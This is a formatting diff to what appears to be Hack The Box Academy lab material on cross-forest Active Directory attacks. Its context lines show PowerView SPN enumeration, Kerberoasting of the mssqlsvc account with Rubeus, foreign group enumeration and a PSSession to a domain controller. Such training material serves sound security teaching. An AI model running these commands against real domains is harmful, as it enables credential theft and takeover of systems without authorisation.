@@ -10,8 +10,7 @@ We can utilize PowerView to enumerate accounts in a target domain that have SPNs
 
 #### Enumerating Accounts for Associated SPNs Using Get-DomainUser
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
 
 samaccountname
@@ -24,8 +23,7 @@ We see that there is one account with an SPN in the target domain. A quick check
 
 #### Enumerating the mssqlsvc Account
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
 
 samaccountname memberof
@@ -37,8 +35,7 @@ Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the
 
 #### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
 
-```
-        powershell
+```powershell
 PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
 
    ______        _
@@ -83,8 +80,7 @@ We can use the PowerView function [Get-DomainForeignGroupMember](https://powersp
 
 #### Using Get-DomainForeignGroupMember
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
 
 GroupDomain             : FREIGHTLOGISTICS.LOCAL
@@ -104,8 +100,7 @@ The above command output shows that the built-in Administrators group in `FREIGH
 
 #### Accessing DC03 Using Enter-PSSession
 
-```
-        powershell
+```powershell
 PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
 
 [ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
